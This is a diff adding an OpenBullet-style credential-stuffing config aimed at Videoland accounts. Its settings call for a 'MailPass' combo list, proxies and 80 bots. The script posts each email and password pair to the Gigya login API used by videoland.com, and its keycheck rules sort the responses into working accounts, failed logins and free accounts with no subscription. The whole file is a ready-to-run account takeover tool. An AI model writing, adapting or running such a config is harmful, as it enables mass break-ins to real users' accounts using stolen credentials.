@@ -1,0 +1,73 @@
+[SETTINGS]
+{
+  "Name": "Videoland",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-11T02:32:47.4160653+02:00",
+  "AdditionalInfo": "Custom = Free",
+  "Author": "Dedrilath",
+  "Version": "1.4.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://accounts.eu1.gigya.com/accounts.login?" 
+  CONTENT "loginID=<USER>&password=<PASS>&sessionExpiration=-2&targetEnv=jssdk&include=profile%2Cdata&includeUserInfo=true&lang=en&APIKey=3_t2Z1dFrbWR-IjcC-Bod1kei6W91UKmeiu3dETVG5iKaY4ILBRzVsmgRHWWo0fqqd&sdk=js_9.1.50&authMode=cookie&pageURL=https%3A%2F%2Fwww.videoland.com%2Fonboarding%2Fsso%2Flogin&format=jsonp&callback=gigya.callback&context=R3248697687&utf8=%26%23x2713%3B" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://cdns.eu1.gigya.com" 
+  HEADER "referer: https://cdns.eu1.gigya.com/gs/webSdk/Api.asp" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"statusReason\": \"OK\"" 
+    KEY "\"isRegistered\": true" 
+  KEYCHAIN Failure OR 
+    KEY "\"errorDetails\":" 
+    KEY "\"invalid loginID or password\"," 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"redirectUrl\": \"https://www.videoland.com/\"," 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"redirectUrl\": \"https://www.videoland.com/onboarding/payment/activate-subscription/2-weken-videoland\"," 
+
